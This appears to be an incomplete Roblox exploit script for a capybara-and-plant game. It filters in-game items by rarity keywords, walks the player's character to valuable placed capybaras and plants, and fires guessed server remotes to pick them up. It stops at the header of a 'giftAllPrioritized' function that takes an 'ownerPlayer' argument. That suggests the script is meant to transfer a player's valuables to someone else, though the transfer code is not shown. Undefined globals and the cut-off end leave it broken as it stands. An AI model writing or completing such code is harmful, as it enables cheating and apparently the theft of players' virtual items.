local MIN_MULT = 1.5

local function isValuable(name)
    local lower = name:lower()
    
    -- Totems are always valuable
    if lower:find("totem") then return true end
    
    -- Hatch Hammers (especially Gilded)
    if lower:find("hatch hammer") or lower:find("hammer") then return true end
    
    -- Specific rare capybara types
    local rareCapybaras = {"ghost","golem","secret","mythic","ascended","divine","celestial","golden","rainbow","mega"}
    for _, capybara in ipairs(rareCapybaras) do
        if lower:find(capybara) and lower:find("capybara") then
            return true
        end
    end
    
    -- Mutations that indicate value
    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","golem","toasty","pristine","radiant"}) do
        if lower:find(mut) then return true end
    end
    
    -- Rare eggs
    if lower:find("egg") and (lower:find("secret") or lower:find("rare") or lower:find("mythic") or lower:find("ghost")) then return true end
    
    -- Items with multipliers (like [1.5x])
    local mult = name:match("%[([%d%.]+)x%]")
    if mult and tonumber(mult) >= MIN_MULT then return true end
    
    return false
end

local function isValuablePlant(name)
    local lower = name:lower()
    
    -- Specific rare plant types
    local rarePlants = {"ghost","mandrake","shock","divine","mythic","ascended","celestial","golden","rainbow","mega"}
    for _, plant in ipairs(rarePlants) do
        if lower:find(plant) then return true end
    end
    
    -- Mutations that indicate value
    for _, mut in ipairs({"shocked","celestial","permafrost","scorched","gold","mega","rainbow","mythic","ascended","divine","secret","ghost","toasty","pristine"}) do
        if lower:find(mut) then return true end
    end
    
    -- Items with multipliers
    local mult = name:match("%[([%d%.]+)x%]")
    if mult and tonumber(mult) >= MIN_MULT then return true end
    
    return false
end

local function pickUpPlacedCapybarasAndPlants()
    -- Find all placed capybaras AND plants, return both separately
    local picked = { capybaras = {}, plants = {} }
    
    local workspace = game:GetService("Workspace")
    for _, obj in ipairs(workspace:GetDescendants()) do
        -- Look for capybara models/instances
        if (obj:IsA("Model") or obj:IsA("Part")) and obj.Name then
            local isCapy = false
            local isPlant = false
            
            -- Check if it's a capybara
            if isValuable(obj.Name) and not (obj.Name:lower():find("pepper") or obj.Name:lower():find("mandrake") or obj.Name:lower():find("plant")) then
                isCapy = true
            end
            
            -- Check if it's a plant
            if isValuablePlant(obj.Name) and (obj.Name:lower():find("pepper") or obj.Name:lower():find("mandrake") or obj.Name:lower():find("plant")) then
                isPlant = true
            end
            
            if isCapy or isPlant then
                local humanoidRoot = obj:FindFirstChild("HumanoidRootPart")
                if humanoidRoot then
                    local char = lp.Character
                    if char and char:FindFirstChild("Humanoid") then
                        local itemType = isCapy and "Capybara" or "Plant"
                        print("📍 Found valuable " .. itemType .. ": " .. obj.Name .. " - picking up...")
                        
                        -- Move close to the item
                        char.Humanoid:MoveTo(humanoidRoot.Position)
                        task.wait(0.8)
                        
                        -- Try multiple remote names for picking up
                        for _, remoteName in ipairs({"PickUp", "Collect", "Grab", "Pick", "Pickup"}) do
                            pcall(function()
                                local remote = RS.Remotes:FindFirstChild(remoteName)
                                if remote then
                                    if remote:IsA("RemoteEvent") then
                                        remote:FireServer(obj)
                                    elseif remote:IsA("RemoteFunction") then
                                        remote:InvokeServer(obj)
                                    end
                                end
                            end)
                        end
                        
                        task.wait(0.5)
                        if isCapy then
                            table.insert(picked.capybaras, obj.Name)
                            print("✓ Picked up Capybara: " .. obj.Name)
                        else
                            table.insert(picked.plants, obj.Name)
                            print("✓ Picked up Plant: " .. obj.Name)
                        end
                    end
                end
            end
        end
    end
    
    if #picked.capybaras > 0 then
        print("✓ Picked up " .. #picked.capybaras .. " capybaras")
    end
    if #picked.plants > 0 then
        print("✓ Picked up " .. #picked.plants .. " plants")
    end
    
    return picked
end

local function giftAllPrioritized(ownerPlayer, items, pickedItems)
